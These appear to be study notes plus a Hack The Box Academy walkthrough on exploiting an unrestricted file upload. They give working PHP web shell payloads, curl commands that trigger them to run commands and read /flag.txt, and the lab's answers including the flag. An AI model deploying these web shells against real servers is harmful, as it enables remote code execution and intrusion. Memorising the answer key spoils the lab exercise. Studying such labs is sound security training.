# NOTE — hands-on section

## ID
<!-- Pick the next free number in the module's range. -->
601

## Module
File Upload Attacks

## Kind
notes

## Title
Section 2 — Absent Validation

## Description
Exploits a web application with zero file upload restrictions by uploading a PHP web shell to achieve Remote Code Execution on the back-end server.

## Tags
file-upload, rce, web-shell, php, arbitrary-upload

## Commands
- `cat << EOF > RCE.php\n<?php system('hostname'); ?>\nEOF`
- `<?php system('<CMD>'); ?>`
- `<?php system($_GET['cmd']); ?>`
- `curl http://<TARGET_IP>:<PORT>/uploads/RCE.php`

## What This Section Covers
Covers the most basic file upload vulnerability: no server-side validation whatsoever, allowing direct upload of PHP scripts. The attacker uploads a PHP payload and navigates to its URL under `/uploads/` to trigger execution, resulting in full RCE.

## Methodology
1. Identify the back-end language — visit `/index.php` (or `.asp`, `.aspx`) to fingerprint the framework, or use Wappalyzer
2. Create a minimal PHP RCE payload: `<?php system('hostname'); ?>`
3. Upload the `.php` file via the web form — no bypass needed since there is no validation
4. Navigate to `http://<TARGET>:<PORT>/uploads/<filename>.php` to trigger execution
5. Read the output directly in the browser

## Multi-step Workflow
```bash
# Create payload
cat << EOF > RCE.php
<?php system('hostname'); ?>
EOF

# Upload via browser (drag & drop or file picker), then trigger:
curl http://<TARGET_IP>:<PORT>/uploads/RCE.php

# For an interactive shell-like experience, use a cmd parameter payload:
# <?php system($_GET['cmd']); ?>
# then: curl "http://<TARGET>/uploads/shell.php?cmd=id"
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — First word of hostname output | `fileuploadsabsentverification` | Navigate to `/uploads/RCE.php` after upload |

## Key Takeaways
- If no file type restriction exists on either front-end or back-end, any file including `.php` can be uploaded and executed directly
- The upload directory (`/uploads/`) is typically web-accessible — always check
- Framework fingerprinting (index.php test, Wappalyzer, Burp scanner) is the first step before crafting payloads
- A minimal `system()` call is enough to confirm RCE; no fancy shell needed for initial validation
- File selector showing "All Files" with no `accept=` attribute on the front-end is a strong hint that no front-end filtering exists either

## Gotchas
- Even if the page says "File successfully uploaded", always verify execution — the file might be stored but not interpreted (wrong directory, wrong permissions, or extension blocked at server level)
- Uploaded files must match the server's scripting language — a `.php` shell does nothing on an ASP.NET server

# HTB Solution

## Question 1

### "Try to exploit the upload feature to upload a web shell and get the content of /flag.txt"

After spawning the target machine, students need to upload one of the shown web shells in the module's section, such as:

        php
`<?php system($_REQUEST['cmd']); ?>`

        shell
`cat << 'EOF' > RCE.php <?php system($_REQUEST['cmd']); ?> EOF`

        shell-session
`┌─[us-academy-1]─[10.10.14.142]─[htb-ac413848@pwnbox-base]─[~] └──╼ [★]$ cat << 'EOF' > RCE.php > <?php system($_REQUEST['cmd']); ?> > EOF`

![File_Upload_Attacks_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_3.png)

After successfully uploading the web shell, students can either use the browser or `cURL` to attain the flag; the latter will be used:

	shell
`curl -s http://STMIP:STMPO/uploads/RCE.php?cmd=cat+/flag.txt`

        shell-session
`┌─[us-academy-1]─[10.10.14.142]─[htb-ac413848@pwnbox-base]─[~] └──╼ [★]$ curl -s 'http://46.101.2.216:30263/uploads/RCE.php?cmd=cat+/flag.txt' HTB{g07_my_f1r57_w3b_5h3ll}`